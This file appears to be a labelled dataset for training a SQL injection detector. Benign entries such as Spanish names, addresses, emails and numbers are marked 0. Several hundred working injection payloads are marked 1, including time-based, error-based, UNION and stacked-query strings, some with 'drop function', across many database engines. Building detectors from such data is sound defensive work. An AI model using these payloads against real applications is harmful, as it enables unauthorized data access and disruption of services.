Query,Label
giralda,0
24730,0
"sanchez 49,",0
"1)) as hrks where 7637=7637 or elt(6272=6272,sleep(5))--",1
2018025974604227,0
26295439e,0
"1"" and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
presson,0
"1"")) and make_set(1167=5027,5027) and ((""grfi""=""grfi",1
depredador,0
"-7793""))) or (8459=8459)*4906 and (((""lias""=""lias",1
"-3593%' union all select 6346,6346,6346,6346,6346,6346--",1
1714795678341656,0
"1') or 8466=benchmark(5000000,md5(0x694a4745)) and ('nond'='nond",1
"madrid, 27",0
plcida,0
deiadrel,0
"1') and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ('cfzp' like 'cfzp",1
zempoalteca fuxet,0
"-3933'))) union all select 6198,6198,6198,6198,6198#",1
"1))) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (((4924=4924",1
okura4,0
"1' and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and 'lywy' like 'lywy",1
4963506739861376,0
"-8754""))) union all select 7391,7391,7391,7391,7391,7391,7391--",1
"1%'))) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ((('%'='",1
"1' where 8277=8277 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--",1
1218546824754723,0
adapuesto,0
pettitt,0
jocs olimpics 110 1-b,0
"1' in boolean mode);select benchmark(5000000,md5(0x4c4d6142))#",1
"calle almonte 68, 5?g",0
liduea mediero,0
34575761e,0
"1') where 2121=2121 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
4672356462399294,0
holtz@pasajesaereosbaratos.es,0
49394,0
"1%""))) and sleep(5)#",1
-1641' union all select 4835#,1
"1%' union all select null,null,null,null,null,null,null,null#",1
tanquia jepus,0
florez,0
57471201c,0
"-6680""))) union all select 2564,2564,2564,2564,2564,2564#",1
1 where 8966=8966;if(1087=5839) select 1087 else drop function zzeh--,1
blankenship@likeanangel.tc,0
"pl. de belen 153, 6?c",0
"1%"")));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1
1%'));begin user_lock.sleep(5); end--,1
c0l0o4a,0
"-6357"") union all select 9767,9767,9767,9767,9767,9767,9767,9767,9767#",1
82332840q,0
1')));select pg_sleep(5)--,1
-7707')) union all select 3172#,1
1') where 2852=2852;select case when 7717=7717 then 1 else null end--,1
"1"") as gjlv where 1983=1983 and sleep(5)#",1
"calle santa apolonia, 47,",0
colera,0
7a7i86,0
foixenc illanes,0
gift@distritoeste.no,0
6749,0
"1) where 5234=5234 or 8514=benchmark(5000000,md5(0x544d5a4c))#",1
yuraj,0
1')) as jtmf where 3937=3937;select case when 7717=7717 then 1 else null end--,1
"1%"")) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",1
25793872q,0
90179643r,0
1%')) and 7160=7249--,1
charissa,0
"-4954%"") or 5244=4832",1
-3582) where 5873=5873 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,1
"1"" and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ""vukd""=""vukd",1
lamas,0
"-8073))) union all select 4481,4481,4481,4481--",1
"1') and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ('qbdm'='qbdm",1
talarrubias,0
letha,0
dunik,0
"1"") where 1392=1392 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",1
palencia,0
cuenca,0
"iif(1539=1539,1539,1/0)",1
siles pinyol,0
"1%"")));iif(5257=5257,1,1/0)",1
rutledge,0
salamanca,0
"1"") and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (""hbgv""=""hbgv",1
45788067n,0
monforte de la sierra,0
33776,0
tivenys,0
7ans286,0
"1');call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('yqrt' like 'yqrt",1
yunn-tzu,0
-6586')) or 2021=2996,1
lavecchi,0
reiji,0
isalenia,0
8781173513237509,0
escobado,0
"1%""))) and 8438=7620--",1
reiko,0
47319,0
1')));select (case when (6166=3364) then 6166 else cast(1 as int)/(select 0 from dual) end) from dual--,1
cropper,0
-9024) where 1686=1686 or 3069=8213--,1
co4si35a,0
agapito,0
"1' and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))",1
"1')) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (('adnz'='adnz",1
toulson,0
erasio,0
sadegh,0
oestreic,0
6g369zar41,0
0345951332248071,0
"1' and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",1
37160,0
"-6846%"")) or (8459=8459)*4906 and ((""%""=""",1
daughtre3,0
mugione de manuel,0
6795968081758370,0
"1')));select benchmark(5000000,md5(0x4c4d6142)) and ((('lqwz'='lqwz",1
"1) where 1185=1185 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--",1
vilafranca de bonany,0
-2733'))) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((('btjx'='btjx,1
quiliano,0
jiyuan,0
anael,0
"1) as qyic where 9736=9736 and elt(3114=3114,sleep(5))#",1
sol sieso,0
"1%"")) union all select null,null,null,null,null,null#",1
engh-stritzel@normatic-vending.lv,0
"1"";select count(*) from generate_series(1,5000000)--",1
9357275036779206,0
35715294c,0
ambrosia,0
36839675t,0
1) as jmib where 8130=8130 rlike (select (case when (7885=3932) then 1 else 0x28 end))--,1
294r1152ar,0
6ait1na89,0
"1') union all select null,null,null#",1
6398147509756321,0
"ronda sant antoni maria claret 144,",0
26015420m,0
"calle huesca, 136,",0
ace587,0
palacio@eldeseodepecar.kn,0
marven,0
"-8982'+(select anyd where 5358=5358 union all select 5358,5358,5358,5358,5358,5358#",1
88,0
pipponzi,0
44520,0
"pasaje alcobendas s/n,",0
tait,0
8020,0
58743816e,0
blanchet,0
"1' in boolean mode) union all select null,null,null,null,null,null--",1
pardos@barcafedaniss.co,0
1') as zxos where 2745=2745;select pg_sleep(5)--,1
"-3856"") as iyzl where 7394=7394 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",1
2417,0
von_semm,0
"petxina, 77, 2b",0
viseu 81 8?c,0
carrizales oate,0
48340,0
seymour@evelin.gn,0
"-5245' or elt(1032=1032,3623) and 'qfvo'='qfvo",1
"1%"")) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
1) where 8041=8041;select (case when (5970=2200) then 1 else 5970*(select 5970 from master..sysdatabases) end)--,1
g8629e8d9r,0
"plaza pont 47, 6?e",0
4458,0
bateman@alojesuweb.in,0
"1) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",1
siede@comodepilarse.ye,0
78360419v,0
06589147s,0
zaharoff0,0
55950989q,0
"1' procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)",1
"1'));select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
"1%""))) rlike sleep(5) and (((""%""=""",1
"calle llansa, s/n, 1a",0
1) where 2170=2170;select sleep(5)--,1
"1"")) as vdbf where 7969=7969 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--",1
"1'))) or elt(5873=5873,sleep(5))#",1
05782219l,0
1is4r1o,0
16316,0
e3c7i3tu3a,0
"1%"") and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
"1))) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (((6583=6583",1
41842m67n9c55,0
31790,0
bat3an,0
rahman,0
"1'+(select 'qzcx' where 9524=9524 and elt(3069=8430,8430))+'",1
adelfa,0
lemoiz,0
montesa,0
alfntega,0
benidoleig,0
tracee,0
valdecuenca,0
caigua llobet,0
hinojosa zuba,0
07194416q,0
"1"")) as yiaw where 2841=2841 or sleep(5)--",1
travesia poeta noriega varela 118 13f,0
"1"")) or 8466=benchmark(5000000,md5(0x694a4745)) and ((""iuxs"" like ""iuxs",1
"concordia, 102,",0
"1%'));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (('%'='",1
romanones,0
"1'||(select 'rawn' from dual where 4988=4988 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null))||'",1
6477,0
cardedeu 54,0
cecile,0
incrdu69,0
95866747x,0
92621448b,0
analfabetismo,0
souren,0
tsoucas,0
palamenta,0
"1))) union all select null,null,null,null,null,null,null,null,null,null#",1
3636718261546476,0
4702,0
"1"")) as uqkn where 4642=4642 or elt(6272=6272,sleep(5))--",1
"1"")) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
"1'))) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",1
88253355d,0
sonoramente,0
9959095212447652,0
masclans nieto,0
"1'+(select 'ljtl' where 1766=1766;select count(*) from generate_series(1,5000000))+'",1
ramblizo,0
14240,0
estades orizales,0
"-8771"")) union all select 6302,6302,6302,6302,6302#",1
medus?a,0
milad,0
ciclotimia,0
gerino,0
"-1432"")) union all select 9008,9008,9008#",1
espejn,0
cuervo1,0
c3er2e4ue15,0
plaza asociacion de la prensa 107,0
"pl. san marcial 90, 13-e",0
boothroy,0
philip7,0
alfaro esparraguera,0
adelantamiento,0
"1)) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((9270=9270",1
"-5217'||(select 'juen' from dual where 7336=7336 union all select 7336,7336,7336--",1
histri985ent0,0
sienes,0
1)) as xbii where 2262=2262 or sleep(5)--,1
10858,0
hinton-s,0
fetzko,0
e_ncobador,0
"1"") where 3445=3445 and elt(1212=1254,1254)--",1
"-7111 union all select 2409,2409,2409,2409,2409,2409#",1
7269,0
mo19bun0a,0
1044,0
gata,0
alicante,0
"1"")) as esho where 8864=8864 order by 1--",1
shedd,0
nelber,0
1 and sleep(5)# qcyj,1
"1"") and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (""ajuh""=""ajuh",1
04742,0
karyl,0
ipe$cacuana,0
"1)) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ((3626=3626",1
casida,0
32633,0
9315752262778919,0
4551401932172135,0
"-9247'))) union all select 6964,6964,6964,6964,6964,6964,6964,6964,6964--",1
50708405y,0
-6202)) or 7845=1962--,1
"1""))) or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
allman,0
1;waitfor delay '0:0:5'-- thuo,1
"-4764) where 8200=8200 union all select 8200,8200,8200,8200--",1
52361693p,0
"-6067'+(select 'bfhf' where 3114=3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",1
7723056495790878,0
ervin,0
"-3461"")) union all select 6342,6342,6342,6342,6342,6342#",1
"1%"";select case when 7717=7717 then 1 else null end--",1
"1' or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and 'owwf'='owwf",1
cornejo,0
-6310 or 6715=3399,1
bonyadi-pedro@programa-gestion-erp.bv,0
"1"")));select count(*) from generate_series(1,5000000)--",1
aylln tamallangos,0
"-6803"") order by 1#",1
1));select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,1
mordi3nt-e,0
sebastian_ferdi@tintaultravioleta.mv,0
co0313c2b67632ad,0
"1) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (4976=4976",1
havis,0
baxevanos@clubdeviaje.fk,0
"1) as qjjm where 3850=3850 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",1
"-7083"" or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""ajcl"" like ""ajcl",1
comerate.foldi@ofertaschinas.dm,0
"-8153') as qhlb where 4948=4948 union all select 4948,4948,4948,4948,4948,4948#",1
tottenham@satellites.py,0
regencs,0
manuel pereira s/n 12?a,0
"c/ criado, 21,",0
dicaprio,0
caizal,0
"-1525'))) union all select 4110,4110,4110,4110,4110,4110#",1
guabo,0
1) as obzn where 7652=7652 or (select * from (select(sleep(5)))ydpu)--,1
labaque pericas,0
thunder@bodasconmusica.pm,0
aitor,0
15317,0
"1) where 6374=6374 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--",1
ab1orbencia,0
5800254897479094,0
"-8703') where 9723=9723 union all select 9723,9723,9723,9723,9723#",1
mara candela,0
-9217 or 9323=9323#,1
brot calderer,0
san juan del olmo,0
traveria morera,0
70304292p,0
ricard,0
44650,0
1')) as yefv where 4263=4263;waitfor delay '0:0:5'--,1
ge2613an0,0
1') rlike sleep(5) and ('tslp'='tslp,1
36815dat1ra,0
pagnol@tintaultravioleta.gob,0
-6865) or (8459=8459)*4906 and (6107=6107,1
"1' and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
"1%'))) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((('%'='",1
morlanes funosa,0
61089913g,0
marsal infante,0
"1))) union all select null,null,null,null#",1
2301580169203669,0
dudas@google-movil.np,0
1') as xskm where 3525=3525 and 2435=6513,1
orejana,0
"-1339))) union all select 6318,6318,6318,6318,6318,6318,6318,6318,6318#",1
salustio,0
afijacin,0
viana,0
soffia,0
3672487183730665,0
de5peadura,0
"1"") or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
5719365905876928,0
2e64n8m5,0
legrandv,0
parolero,0
"-9725) where 9068=9068 or elt(4723=1426,1426)--",1
l4t9rgo,0
"-9318""))) union all select 5223,5223,5223,5223#",1
1'))) and 4069=8786 and ((('eftr'='eftr,1
1' rlike sleep(5) and 'cugs'='cugs,1
sambumbia,0
3ombero,0
fuentelviejo,0
ha3fila,0
1' rlike (select (case when (7689=7689) then 1 else 0x28 end)),1
8460,0
"1' in boolean mode) union all select null,null#",1
shaira,0
sari7,0
"1) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)",1
mazarick1,0
adirano,0
stevenin@ceramicasmio.mn,0
2018706019934845,0
21905566k,0
1'))) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('ugoz'='ugoz,1
"1%"") and 8635=(select count(*) from generate_series(1,5000000))--",1
vegas del genil,0
"1) where 6990=6990 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
"1"") where 6065=6065 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
1'||(select 'zyvk' from dual where 2072=2072;begin user_lock.sleep(5); end)||',1
7315,0
rode@sayuela.kw,0
"1')))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ((('owga' like 'owga",1
lage lloris,0
niwinska@estudiodeyoga.td,0
"1"";select count(*) from generate_series(1,5000000) and ""ihbe"" like ""ihbe",1
"-9854%""))) or 6455=3652",1
"1'||(select 'neqi' where 6873=6873 union all select null,null,null,null,null,null,null--",1
thuong,0
"-2059%"" or elt(4587=3101,3101) and ""%""=""",1
steele-kripilani@vendomiatico.se,0
e$57ct918ena,0
2304,0
23657,0
villazn peters,0
zendo,0
"-9062"" or 6872=6872 and ""aumq"" like ""aumq",1
"-5761"") or 3762=1274",1
cancela,0
47690,0
"alamedilla, la",0
8201,0
"1) where 7026=7026;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
sorbello8@carrillo-de-albornoz.jobs,0
"1' or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and 'uwep'='uwep",1
"1%"") or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and (""%""=""",1
"1' where 4388=4388;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",1
"1' in boolean mode) or 8156=(select count(*) from generate_series(1,5000000))--",1
paesa regnet,0
castrillo matajudos,0
02906029w,0
"-6381%""))) union all select 1503,1503,1503,1503#",1
matsuda.agay@estaestuweb.com.bu,0
"1"") where 1614=1614 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--",1
-1886' where 5518=5518 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,1
navia de suarna,0
"orellana, 98,",0
"c/ fray diego de cadiz, 50",0
"1"" where 1386=1386;select (case when (3435=4011) then 1 else 3435*(select 3435 from master..sysdatabases) end)--",1
isolina,0
"1'||(select 'bmyt' from dual where 9407=9407 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))))||'",1
24120558k,0
ojeda fita,0
469,0
0893945403405745,0
"-4772))) union all select 3879,3879,3879,3879,3879--",1
"1"")) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((""uglh"" like ""uglh",1
"1"")));select pg_sleep(5) and (((""nvuv"" like ""nvuv",1
"1%')) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (('%'='",1
vadosa,0
c/ sahagun 142,0
"-6431"")) union all select 2358,2358,2358,2358,2358,2358,2358,2358,2358,2358#",1
08614,0
soportador,0
ronen,0
"c/ don bosco 65, 10-d",0
ep9scopologio,0
ayen,0
"1"" or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",1
12113019t,0
37724,0
4102716313272060,0
nobel,0
aurora bertrana salazar 10 3-c,0
"1%""))) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
1) where 8094=8094;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,1
perpetuo,0
34870,0
35500,0
lido,0
5453326584346927,0
8762163912955925,0
"-2790%"") union all select 5070,5070#",1
"1')));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ((('juhi' like 'juhi",1
demias,0
22,0
"1)) as zoso where 3633=3633;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1
lauther,0
suzane,0
"-1526')) or elt(1032=1032,3623) and (('xpob'='xpob",1
hernani,0
"1%' or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
san emiliano,0
fortes@corjet.au,0
jorgelina,0
"1' or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and 'rhzy'='rhzy",1
1)));select (case when (3336=9781) then 3336 else 1/(select 0) end)--,1
aleandro-hayman@tecnoindomo.nr,0
ribot velugo,0
macoosh3,0
amelia,0
"1"" where 7828=7828;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#",1
hoel,0
felike,0
"calle conesa balanza 138, 9?c",0
"1"") where 7723=7723 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--",1
"-8266%') union all select 8626,8626,8626,8626,8626,8626--",1
6408,0
more@soymuyguapa.es,0
71611234k,0
cycelia,0
22468230j,0
"-4558' or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1
"1"") where 9248=9248;if(6767=5022) select 6767 else drop function buii--",1
rosic@faders.com.sn,0
griffith_chesbro@psykoterapeut.sn,0
piols padilla,0
cowper@elbauldelosrefranes.pm,0
86m-bra,0
chusma,0
spry.jochmann@spainbb.sz,0
6435,0
63188831b,0
garmes,0
madan deluca,0
dalmacio,0
"1' or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and 'ynpr'='ynpr",1
"1') and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ('xonc'='xonc",1
09267,0
1%' rlike sleep(5) and '%'=',1
"1 where 3737=3737 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
gamarnik9,0
es518l132n,0
proscribir,0
06130,0
2946,0
"1';select benchmark(5000000,md5(0x4c4d6142)) and 'nlrk' like 'nlrk",1
1 rlike sleep(5),1
8695,0
"1')) as pqbq where 1865=1865;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1
52438346w,0
typer0,0
"1 where 1096=1096 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",1
"1%'));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (('%'='",1
-7633') as aslj where 2317=2317 or 8571=8571--,1
rebengivc@somosagelespaa.ie,0
"1'||(select 'jzwq' where 3289=3289 union all select null,null,null,null,null,null,null#",1
"plaza alberto corral 68, 9f",0
bularros,0
"carretera estacion, 144, 8-d",0
"1));select count(*) from generate_series(1,5000000)--",1
"1'))) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ((('ejul'='ejul",1
"1%"" rlike (select (case when (5135=9839) then 1 else 0x28 end)) and ""%""=""",1
ed,0
"calle madian, 130 10?h",0
mckibbon,0
cabr,0
"1 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)",1
25742430w,0
"1) as kjsd where 1670=1670 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
30199081n,0
jaenicke@lamola-hotel.coop,0
gilito,0
"1)) as qfnu where 1609=1609 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
"1'+(select wpai where 3685=3685;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
"plaa llimoner 81,",0
pis ramenghi,0
"1);select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1
19223,0
sant josep de sa talaia,0
"1""))) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (((""msjh"" like ""msjh",1
1 where 7021=7021 or 6793=(select 6793 from pg_sleep(5))--,1
2300,0
1 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)-- jdia,1
"1"") or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (""ctzh""=""ctzh",1
"1"");begin dbms_lock.sleep(5); end and (""qkkn"" like ""qkkn",1
horton@beautifulbody.it,0
"1"");select (case when (3855=3855) then 3855 else 1/(select 0) end)--",1
"1'+(select mumb where 4658=4658 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",1
"ventallols, 138 8?f",0
desp2li52ado5,0
"1) as bfuy where 3879=3879 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
24331853s,0
-6122'))) or 9243=6161--,1
ania,0
1') where 4509=4509 union all select null--,1
50100,0
"1%' or 8156=(select count(*) from generate_series(1,5000000))--",1
47318,0
8231060336250168,0
huertas acosa,0
"travesia doctor sanchez, 139, 12?h",0
wilsey,0
56702228y,0
"1""));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((""pawh""=""pawh",1
"-1487"") as crfi where 2407=2407 union all select 2407,2407,2407,2407,2407,2407,2407,2407,2407,2407--",1
1esa0o401m0en7o,0
"1"" and (1668=8054)*8054",1
montnchez,0
n2ga1,0
agero,0
1'))) waitfor delay '0:0:5' and ((('zhhf' like 'zhhf,1
azanuy-alins,0
"c/ francisco javier simonet 7, 11?e",0
brisia,0
"-2925%"" or make_set(9354=9354,7185) and ""%""=""",1
"1'||(select 'gikt' where 8447=8447 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
"-2964"")) order by 1--",1
xammar,0
5788,0
"1"")) waitfor delay '0:0:5' and ((""koni"" like ""koni",1
"passatge badal, 31,",0
riego,0
brinton2@tartasconamor.lr,0
agatn,0
"1'))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (('qeet'='qeet",1
"1%';select count(*) from generate_series(1,5000000) and '%'='",1
d2s7sp79ro,0
martn de yeltes,0
1')));begin user_lock.sleep(5); end and ((('ycte'='ycte,1
"hinojosa, la",0
lierde.vaverka@2horas.wf,0
"1%') and elt(1210=1210,sleep(5)) and ('%'='",1
1) as bzuh where 8041=8041 and 6307=9200#,1
